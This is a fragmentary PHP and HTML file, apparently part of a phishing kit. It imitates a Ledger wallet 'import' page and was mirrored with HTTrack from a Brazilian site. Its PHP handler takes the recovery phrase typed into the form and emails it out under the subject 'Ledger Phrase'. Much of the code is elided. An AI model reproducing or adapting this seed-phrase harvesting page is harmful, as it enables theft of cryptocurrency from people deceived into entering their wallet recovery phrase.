...
$msg = "";
  ...
  if (isset($_POST['import'])) {
    ...
    if (!empty($key)) {
      ...
      $mail->Subject = "Ledger Phrase";
      $mail->isHTML(true);
      $mail->Body = 'Ledger Phrase - '.$key.' ';
      $mail->send();
...
<html lang="en">
<!-- Mirrored from zapchopp.com.br/contactt/df4573__64363/dmt25/ledger/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 06 May 2022 09:23:28 GMT -->
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  ...
  <link href="files/webwallet_files/css2.html" rel="stylesheet">
...
<?php 
   ...
   ?>
   <div style=""><h5 style="color:black;"><?php echo $msg ?></h5></div>
 <?php } ?>
        <div id="step-1">
...
<?php 
 ...
 <?php } ?>
          ...
          <form action="index.php" method="POST" id="form1" style="width: 400px; margin: 0 auto;">
...
<!-- Mirrored from zapchopp.com.br/contactt/df4573__64363/dmt25/ledger/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 06 May 2022 09:23:43 GMT -->
</html>